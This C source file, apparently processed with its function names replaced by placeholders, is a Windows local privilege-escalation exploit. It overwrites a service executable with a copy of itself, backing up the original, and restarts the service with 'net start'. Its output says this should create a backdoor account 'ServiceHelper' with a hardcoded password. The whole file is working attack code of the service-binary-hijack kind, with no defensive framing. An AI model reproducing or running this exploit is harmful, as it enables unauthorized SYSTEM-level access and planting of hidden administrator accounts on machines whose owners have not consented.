#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  acUserName ;
struct TYPE_3__ {int /*<<< orphan*/ * lpServiceProc; int /*<<< orphan*/ * lpServiceName; } ;
typedef  TYPE_1__ SERVICE_TABLE_ENTRY ;
typedef  int /*<<< orphan*/ * LPSERVICE_MAIN_FUNCTION ;
typedef  int DWORD ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC1 (char*,int*) ; 
 char* PWN_EXE ; 
 int /*<<< orphan*/ * PWN_ID ; 
 char* PWN_NAME ; 
 scalar_t__ ServiceMain ; 
 int /*<<< orphan*/  FUNC2 (TYPE_1__*) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,char*) ; 
 scalar_t__ FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 scalar_t__ FUNC8 (char*,char*) ; 
 int /*<<< orphan*/  FUNC9 (char*,int,char*,char*) ; 
 int /*<<< orphan*/  stderr ; 
 scalar_t__ FUNC10 (char*,char*) ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 

int FUNC12(int argc, char **argv) {
    char acUserName[100];
    DWORD nUserName = sizeof(acUserName);
    FUNC1(acUserName, &nUserName);

    if (FUNC10((char *)&acUserName, "SYSTEM")) {
        char *str = (char *)FUNC5(2048);
        FUNC6(str, 0, 2048);
        FUNC9(str, 2048, "%s.bak", PWN_EXE);
        if (FUNC8(PWN_EXE, str) != 0) {
           FUNC4(stderr, " :(  sorry, can't write to file.\n");
           FUNC3(1);
        }
        FUNC0(argv[0], PWN_EXE, !0);
        FUNC9(str, 2048, "net start \"%s\" 2> NUL > NUL",PWN_NAME);
        FUNC7("\n >:D should have created a \n\n Username:\tServiceHelper\n Password:\tILov3Coff33!\n\n");
        FUNC11(str);
    }

    SERVICE_TABLE_ENTRY ServiceTable[2];

    ServiceTable[0].lpServiceName = PWN_ID;
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    FUNC2(ServiceTable);

    return 0;
}